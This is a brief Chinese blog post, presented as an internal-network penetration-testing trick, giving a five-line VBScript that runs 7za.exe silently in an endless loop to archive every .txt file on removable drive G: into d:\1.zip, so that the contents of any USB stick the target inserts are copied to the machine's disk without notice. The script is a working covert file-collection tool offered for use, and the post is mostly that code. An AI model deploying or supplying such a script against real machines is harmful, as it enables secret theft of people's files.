  <div class="article-top-meta">

  <div class="article-content">
    <div class="entry">
      
        <p>内网渗透测试过程中，可以通过vbs脚本循环打包pc目标机的可移动盘符，在目标插入u盘时立即打包文件到目标机硬盘上。</p>
<a id="more"></a>
<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><p>需要工具7za.exe，结束进程wscript.exe即可停止工作。</p>
<h3 id="VBS代码"><a href="#VBS代码" class="headerlink" title="VBS代码"></a>VBS代码</h3><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> ws=WScript.<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ws.Run <span class="string">"C:\Windows\Temp\7za.exe a d:\1.zip -r g:\*.txt"</span>, <span class="number">0</span>, <span class="literal">true</span>   <span class="comment">'静默执行命令：打包g盘所有的txt文件到d:\1.zip</span></span><br><span class="line">WScript.Sleep <span class="number">1000</span>*<span class="number">1</span>   <span class="comment">'sleep 1秒</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
